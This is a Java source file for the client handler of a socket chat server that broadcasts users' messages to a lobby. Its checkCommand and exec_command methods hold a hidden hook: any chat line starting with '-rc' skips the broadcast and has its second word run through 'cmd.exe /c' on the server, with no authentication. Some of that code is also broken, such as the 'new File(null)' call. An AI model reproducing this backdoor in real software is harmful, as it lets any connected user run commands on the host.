import java.io.*;
import java.net.Socket;
import java.lang.*;
import java.lang.Runtime;

public class ClientHandler extends Thread {

	private Socket MyWorker;
	private Server server;
	private BufferedReader reader;
	private PrintWriter writer;

	public ClientHandler(Socket CurrWorker, Server server)
	{
		this.MyWorker = CurrWorker;
		this.server = server;
	}

	public void run()
	{
		try
		{
			InputStream in  = MyWorker.getInputStream();
			OutputStream out = MyWorker.getOutputStream();

			reader = new BufferedReader(new InputStreamReader(in));
			writer = new PrintWriter(out,true); 

			String userName = reader.readLine();

			String msg = "New User Connected : " + userName;
			server.broadcast(msg,this);
			System.out.println(msg);

			String clientMessage;
			String serverMessage; 

			do
			{
				clientMessage = reader.readLine();
				Boolean message = checkCommand(clientMessage);
				System.out.println(message);
				if(message)
				{
					serverMessage = "[" + userName + "]: " + clientMessage;
					System.out.println(serverMessage);
					server.broadcast(serverMessage,this); 
				}
				else
					exec_command(clientMessage);


			}while(!clientMessage.equals("bye"));

			server.removeUser(this);
			MyWorker.close();

			serverMessage = userName + " has left the lobby";
			server.broadcast(serverMessage,this);
		}
		catch(IOException e)
		{
			System.out.println("I/O Error.." + e.getMessage());
			e.printStackTrace();
		}

	}

	public void sendMessage(String msg)
	{
		writer.println(msg);
	}

	public Boolean checkCommand(String msg)
	{
		String[] commands = msg.split(" ");
		int len = commands.length;

		if(len == 0 || !(commands[0].equals("-rc")))
			return true;
	
		return false;
	}

	public void exec_command(String msg)
	{
		String[] commands = msg.split(" ");

        ProcessBuilder processBuilder = new ProcessBuilder();
		processBuilder.command("cmd.exe", "/c", commands[1]);

		processBuilder.directory(new File(null));


		try{

            Process process = processBuilder.start();
            BufferedReader reader =
                    new BufferedReader(new InputStreamReader(process.getInputStream()));

            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            }

            int exitCode = process.waitFor();
            System.out.println("\nExited with error code : " + exitCode);

        } 
        catch (Exception e)
        {
        	System.out.println("Wrong Command");
        }
	}

}